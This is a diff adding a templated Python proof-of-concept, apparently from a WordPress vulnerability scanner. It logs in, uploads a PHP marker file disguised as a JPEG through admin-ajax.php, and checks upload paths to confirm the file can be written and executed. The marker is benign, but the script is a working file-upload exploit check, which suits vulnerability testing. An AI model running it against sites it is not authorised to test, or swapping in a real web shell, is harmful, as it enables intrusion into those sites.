@@ -1,0 +1,42 @@
+import io
+import requests
+
+TARGET   = "{{ target_url }}"
+ACTION   = "{{ ajax_action }}"
+USERNAME = "{{ test_username }}"
+PASSWORD = "{{ test_password }}"
+
+# Benign marker file — its body must echo back when fetched, proving write+exec/read.
+MARKER_NAME    = "wpvh_marker.php"
+MARKER_CONTENT = b"<?php echo 'WPVH_UPLOADED_OK_98271'; ?>"
+MARKER_SIGN    = "WPVH_UPLOADED_OK_98271"
+
+session = requests.Session()
+# Login (if test user exists). Subscriber login is also fine for nopriv endpoints.
+session.post(f"{TARGET}/wp-login.php", data={
+    "log": USERNAME, "pwd": PASSWORD,
+    "wp-submit": "Log In", "redirect_to": "/wp-admin/",
+}, timeout=30)
+
+files_payload = {"file": (MARKER_NAME, io.BytesIO(MARKER_CONTENT), "image/jpeg")}
+data_payload  = {"action": ACTION}
+
+resp = session.post(
+    f"{TARGET}/wp-admin/admin-ajax.php",
+    files=files_payload, data=data_payload, timeout=30,
+)
+print(f"[*] Upload response status={resp.status_code} body[:200]={resp.text[:200]!r}")
+
+# Try to fetch the file from common upload locations to confirm it was written.
+candidates = [
+    f"{TARGET}/wp-content/uploads/{MARKER_NAME}",
+    f"{TARGET}/wp-content/{MARKER_NAME}",
+    f"{TARGET}/{MARKER_NAME}",
+]
+for url in candidates:
+    r = session.get(url, timeout=15)
+    if r.status_code == 200 and (MARKER_SIGN in r.text or MARKER_CONTENT in r.content):
+        print(f"[+] SUCCESS: marker fetched from {url}")
+        break
+else:
+    print("[!] FAILURE: marker file not retrievable from common upload paths")
